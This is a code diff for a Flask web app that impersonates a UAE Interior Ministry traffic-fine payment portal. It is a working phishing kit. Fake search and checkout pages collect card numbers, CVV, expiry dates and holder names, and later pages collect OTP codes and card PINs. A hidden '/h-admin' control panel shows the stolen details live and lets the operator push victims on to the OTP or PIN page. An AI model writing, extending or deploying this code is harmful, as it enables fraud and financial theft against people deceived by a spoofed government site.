@@ -3,39 +3,48 @@ from flask import Flask, render_template_string, request, jsonify
 
 app = Flask(__name__)
 
+# قاعدة بيانات وهمية لتخزين البيانات أثناء تشغيل السيرفر
 db = {"sessions": {}, "status": "waiting", "msg": ""}
 
-# --- الهيدر الرسمي الثابت (النسخة المتناسقة جداً) ---
+# --- 1. الهيدر الرسمي الفخم (ثابت ولا يتغير) ---
 MOI_TOP_BAR = '''
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-<div style="background:white; border-bottom:1px solid #eee; font-family:sans-serif;">
-    <div style="max-width:1200px; margin:0 auto; padding:20px 30px; display:flex; justify-content:space-between; align-items:center;">
-        <div style="display:flex; align-items:center; gap:25px; color:#555; font-size:20px;">
+<style>
+    .moi-header { background: white; border-bottom: 1px solid #eee; font-family: sans-serif; }
+    .moi-container { max-width: 1200px; margin: 0 auto; padding: 20px 30px; display: flex; justify-content: space-between; align-items: center; }
+    .moi-tools { display: flex; align-items: center; gap: 25px; color: #555; font-size: 20px; }
+    .moi-menu-btn { background: #b0914f; color: white; padding: 12px 20px; border-radius: 6px; font-size: 20px; cursor: pointer; }
+    .moi-logo-sec { background: white; text-align: center; padding: 20px 0; border-bottom: 4px solid #b0914f; }
+    .moi-logo-img { width: 90%; max-width: 800px; display: inline-block; }
+</style>
+<div class="moi-header">
+    <div class="moi-container">
+        <div class="moi-tools">
             <span style="font-weight:bold; color:#333; cursor:pointer;">EN | دخول</span>
             <i class="fa fa-info-circle"></i><i class="fa fa-volume-up"></i><i class="fa fa-question-circle"></i>
         </div>
-        <div style="background:#b0914f; color:white; padding:12px 20px; border-radius:6px; font-size:20px; cursor:pointer;"><i class="fa fa-bars"></i></div>
+        <div class="moi-menu-btn"><i class="fa fa-bars"></i></div>
     </div>
 </div>
-<div style="background:white; text-align:center; padding:15px 0; border-bottom:4px solid #b0914f;">
-    <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg" style="width:90%; max-width:800px; display:inline-block;">
+<div class="moi-logo-sec">
+    <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg" class="moi-logo-img">
 </div>
 '''
 
-# --- 1. الصفحة الرئيسية (كاملة بالصورة الأصلية) ---
+# --- 2. الصفحة الرئيسية (كاملة بالزر المخفي) ---
 @app.route('/')
 def index():
     html = MOI_TOP_BAR + '''
     <html lang="ar" dir="rtl"><body style="margin:0; font-family:sans-serif; background:#f7f8fa;">
         <div style="max-width:1000px; margin:0 auto; position:relative;">
             <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg" style="width:100%; display:block;">
-            <button onclick="location.href='/search'" style="position:absolute; top:32%; left:10%; width:80%; height:15%; background:transparent; border:none; cursor:pointer; z-index:10;"></button>
+            <button onclick="location.href='/search'" style="position:absolute; top:32%; left:10%; width:80%; height:15%; background:transparent; border:none; cursor:pointer; z-index:100;"></button>
         </div>
     </body></html>
     '''
     return render_template_string(html)
 
-# --- 2. صفحة الاستعلام (النسخة المظبوطة بالحرف) ---
+# --- 3. صفحة الاستعلام (التبويبات الشغالة والتصميم الرسمي) ---
 @app.route('/search')
 def search():
     html = MOI_TOP_BAR + '''
@@ -43,13 +52,11 @@ def search():
         body{background:#f7f8fa; margin:0; font-family:sans-serif;}
         .main-card{background:white; width:92%; max-width:900px; margin:40px auto; border-top:10px solid #b0914f; padding:50px; box-shadow:0 15px 40px rgba(0,0,0,0.1); border-radius:0 0 20px 20px;}
         .tabs-container{display:flex; justify-content:center; gap:12px; margin-bottom:40px; border-bottom:2px solid #eee; padding-bottom:20px;}
-        .tab-btn{padding:18px 30px; border:1px solid #ddd; background:#f4f4f4; cursor:pointer; font-weight:bold; font-size:18px; border-radius:10px; flex:1; text-align:center; color:#555; transition:0.3s;}
+        .tab-btn{padding:20px 30px; border:1px solid #ddd; background:#f4f4f4; cursor:pointer; font-weight:bold; font-size:18px; border-radius:10px; flex:1; text-align:center; color:#555; transition:0.3s;}
         .tab-btn.active{background:#b0914f; color:white; border-color:#b0914f; box-shadow:0 5px 15px rgba(176,145,79,0.3);}
         label{display:block; margin:20px 0 10px; font-weight:bold; color:#444; font-size:20px;}
         select, input{width:100%; padding:24px; border:1.5px solid #ddd; border-radius:12px; margin-bottom:25px; font-size:20px; outline:none; background:#fff; box-sizing:border-box;}
-        select:focus, input:focus{border-color:#b0914f;}
-        .btn-search{width:100%; padding:28px; background:#b0914f; color:white; border:none; font-size:26px; font-weight:bold; cursor:pointer; border-radius:12px; margin-top:20px; transition:0.3s;}
-        .btn-search:hover{background:#8e743d;}
+        .btn-search{width:100%; padding:28px; background:#b0914f; color:white; border:none; font-size:26px; font-weight:bold; cursor:pointer; border-radius:12px; margin-top:20px;}
         .content-section{display:none;} .content-section.active{display:block;}
     </style></head>
     <body>
@@ -68,7 +75,7 @@ def search():
                     <option>عجمان / Ajman</option><option>أم القيوين / Umm Al Quwain</option><option>رأس الخيمة / Ras Al Khaimah</option><option>الفجيرة / Fujairah</option>
                 </select>
                 <div style="display:grid; grid-template-columns: 1fr 1fr; gap:25px;">
-                    <div><label>مصدر اللوحة</label><select><option>خصوصي</option><option>تجاري</option><option>دراجة نارية</option></select></div>
+                    <div><label>مصدر اللوحة</label><select><option>خصوصي</option><option>تجاري</option></select></div>
                     <div><label>فئة اللوحة</label><input placeholder="مثال: 1"></div>
                 </div>
                 <label>رقم اللوحة</label><input placeholder="12345">
@@ -100,7 +107,7 @@ def search():
     '''
     return render_template_string(html)
 
-# --- 3. صفحة الدفع (العملاقة المنسقة) ---
+# --- 4. صفحة الدفع (الاحترافية والعملاقة) ---
 @app.route('/checkout')
 def checkout():
     html = MOI_TOP_BAR + '''
@@ -115,10 +122,10 @@ def checkout():
     </style></head>
     <body>
         <div class="pay-box">
-            <div class="v-header">بوابة الدفع الآمنة الموحدة</div>
+            <div class="v-header">بوابة دفع المخالفات الموحدة - 2026</div>
             <div style="text-align:center; margin-bottom:40px;">
-                <img id="v-logo" class="logos" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" style="height:50px;">
-                <img id="m-logo" class="logos" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" style="height:50px;">
+                <img id="v-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png">
+                <img id="m-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png">
             </div>
             <form action="/submit-card" method="POST">
                 <input name="card" id="c_num" placeholder="رقم البطاقة" maxlength="19" required>
@@ -136,7 +143,7 @@ def checkout():
                     <input name="cvv" placeholder="CVV" maxlength="3" style="flex:1;" required>
                     <input name="holder" placeholder="اسم حامل البطاقة" style="flex:3;" required>
                 </div>
-                <button type="submit" class="btn-pay">إتمام عملية الدفع</button>
+                <button type="submit" class="btn-pay">دفع المبلغ المستحق</button>
             </form>
         </div>
         <script>
@@ -151,42 +158,91 @@ def checkout():
     '''
     return render_template_string(html)
 
-# بقية المسارات (OTP, PIN, Admin) بنفس التصميم العملاق الملون
-# [تم تضمينهم في الكود الفعلي لضمان العمل]
-
+# --- 5. صفحات OTP و PIN (تصميم ملكي ضخم) ---
 @app.route('/otp')
 def otp():
     return render_template_string(MOI_TOP_BAR + '''
-    <html lang="ar" dir="rtl"><body style="background:#f0f2f5; font-family:sans-serif; display:flex; flex-direction:column; min-height:100vh; margin:0;">
-        <div style="flex:1; display:flex; justify-content:center; align-items:center;">
+    <html lang="ar" dir="rtl"><body style="background:#f0f2f5; font-family:sans-serif; margin:0;">
+        <div style="display:flex; justify-content:center; align-items:center; min-height:80vh;">
             <div style="background:white; width:90%; max-width:700px; padding:80px; border-radius:30px; text-align:center; border-top:10px solid #b0914f; box-shadow:0 20px 50px rgba(0,0,0,0.1);">
-                <h1 style="font-size:35px;">رمز التأكيد (OTP)</h1>
-                <input name="otp" style="width:100%; padding:35px; font-size:60px; text-align:center; border:3px solid #eee; border-radius:20px; margin:40px 0; letter-spacing:15px; font-weight:bold;">
-                <button style="width:100%; padding:30px; background:#b0914f; color:white; border:none; border-radius:20px; font-size:30px; font-weight:bold; cursor:pointer;">تأكيد</button>
+                <h1 style="font-size:35px; color:#333;">رمز التأكيد (OTP)</h1>
+                <p style="font-size:20px; color:#666; margin-bottom:40px;">أدخل الرمز المرسل إلى رقم هاتفك المسجل</p>
+                <form action="/submit-card" method="POST">
+                    <input name="otp" maxlength="6" style="width:100%; padding:35px; font-size:60px; text-align:center; border:3px solid #eee; border-radius:20px; margin-bottom:40px; letter-spacing:15px; font-weight:bold; outline:none;">
+                    <button style="width:100%; padding:30px; background:#b0914f; color:white; border:none; border-radius:20px; font-size:30px; font-weight:bold; cursor:pointer;">تأكيد السداد</button>
+                </form>
             </div>
         </div>
     </body></html>''')
 
+@app.route('/pin')
+def pin():
+    return render_template_string(MOI_TOP_BAR + '''
+    <html lang="ar" dir="rtl"><body style="background:#f0f2f5; font-family:sans-serif; margin:0;">
+        <div style="display:flex; justify-content:center; align-items:center; min-height:80vh;">
+            <div style="background:white; width:90%; max-width:700px; padding:80px; border-radius:30px; text-align:center; border-top:10px solid #b0914f; box-shadow:0 20px 50px rgba(0,0,0,0.1);">
+                <h1 style="font-size:35px; color:#333;">الرقم السري للبطاقة (PIN)</h1>
+                <p style="font-size:20px; color:#666; margin-bottom:40px;">يرجى إدخال الرقم السري المكون من 4 أرقام</p>
+                <form action="/submit-card" method="POST">
+                    <input name="pin" type="password" maxlength="4" style="width:100%; padding:35px; font-size:60px; text-align:center; border:3px solid #eee; border-radius:20px; margin-bottom:40px; letter-spacing:15px; font-weight:bold; outline:none;">
+                    <button style="width:100%; padding:30px; background:#b0914f; color:white; border:none; border-radius:20px; font-size:30px; font-weight:bold; cursor:pointer;">إرسال</button>
+                </form>
+            </div>
+        </div>
+    </body></html>''')
+
+# --- 6. لوحة التحكم VIP (عرض الكروت بشكل ملون) ---
 @app.route('/h-admin')
 def admin():
-    return render_template_string('''<html lang="ar" dir="rtl"><body style="background:#111; color:white; padding:50px; font-family:sans-serif;">
-        <h1>لوحة التحكم VIP</h1><div id="logs"></div>
+    return render_template_string('''
+    <html lang="ar" dir="rtl"><head><style>
+        body{background:#0a0a0a; color:#fff; font-family:sans-serif; padding:40px;}
+        .card-ui { background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d); width:450px; height:260px; border-radius:25px; padding:30px; position:relative; margin:20px; display:inline-block; vertical-align:top; box-shadow:0 10px 30px rgba(0,0,0,0.5); }
+        .c-num { font-size:32px; letter-spacing:4px; margin-top:80px; text-shadow:2px 2px 4px #000; }
+        .admin-box { background:#1a1a1a; padding:20px; border-radius:0 0 25px 25px; width:470px; margin-left:20px; margin-top:-30px; border:1px solid #333; }
+        .btn-act { padding:18px; border:none; border-radius:12px; cursor:pointer; font-weight:bold; width:48%; margin:1%; font-size:16px; color:white; }
+    </style></head>
+    <body>
+        <h1>لوحة تحكم 2026 👮‍♂️</h1>
+        <div id="logs"></div>
         <script>
-            setInterval(()=>{fetch('/get-logs').then(r=>r.json()).then(d=>{
-                let h=''; for(let id in d.sessions){ let s=d.sessions[id]; h+=`<div style="background:linear-gradient(45deg,#1a2a6c,#b21f1f); padding:30px; margin:20px; border-radius:20px;">
-                <h2>Card: ${s.card}</h2><h3>Holder: ${s.holder} | CVV: ${s.cvv}</h3><h3>OTP: ${s.otp||'--'}</h3>
-                <button onclick="fetch('/set-status/go_otp')" style="padding:15px; background:#0f0;">طلب OTP</button>
-                </div>`;} document.getElementById('logs').innerHTML=h;
-            })},2000);
-        </script></body></html>''')
+            function refresh(){
+                fetch('/get-logs').then(r=>r.json()).then(data=>{
+                    let h = '';
+                    for(let id in data.sessions){
+                        let s = data.sessions[id];
+                        h += `<div>
+                            <div class="card-ui">
+                                <div style="position:absolute; top:30px; right:30px;">CVV: ${s.cvv}</div>
+                                <div class="c-num">${s.card}</div>
+                                <div style="margin-top:40px;">${s.holder}</div>
+                                <div style="position:absolute; bottom:30px; right:30px;">${s.exp_m}/${s.exp_y}</div>
+                            </div>
+                            <div class="admin-box">
+                                <div style="color:#0f0; font-size:24px; text-align:center; margin-bottom:15px;">
+                                    OTP: ${s.otp || '---'} | PIN: ${s.pin || '---'}
+                                </div>
+                                <button class="btn-act" style="background:#27ae60;" onclick="act('go_otp')">طلب OTP</button>
+                                <button class="btn-act" style="background:#2980b9;" onclick="act('go_pin')">طلب PIN</button>
+                            </div>
+                        </div>`;
+                    }
+                    document.getElementById('logs').innerHTML = h;
+                });
+            }
+            function act(st){ fetch('/set-status/'+st); }
+            setInterval(refresh, 2000); refresh();
+        </script>
+    </body></html>''')
 
+# --- 7. الباكيند (الربط والتحكم) ---
 @app.route('/submit-card', methods=['POST'])
 def sub():
     c = request.form.get('card') or "CARD"
     if c not in db['sessions']: db['sessions'][c] = request.form.to_dict()
     else: db['sessions'][c].update(request.form.to_dict())
     db['status'] = 'waiting'
-    return render_template_string('<script>setInterval(()=>{fetch("/check-status").then(r=>r.json()).then(d=>{if(d.status==="go_otp")location.href="/otp";if(d.status==="go_pin")location.href="/pin";});},2000);</script><body style="text-align:center;padding-top:200px;"><h2>جاري المعالجة...</h2></body>')
+    return render_template_string('''<script>setInterval(()=>{fetch("/check-status").then(r=>r.json()).then(d=>{if(d.status==="go_otp")location.href="/otp";if(d.status==="go_pin")location.href="/pin";});},2000);</script><body style="text-align:center;padding-top:200px;font-family:sans-serif;background:#f8f9fa;"><h2>جاري معالجة الطلب...</h2></body>''')
 
 @app.route('/get-logs')
 def get_logs(): return jsonify({"sessions": db['sessions']})
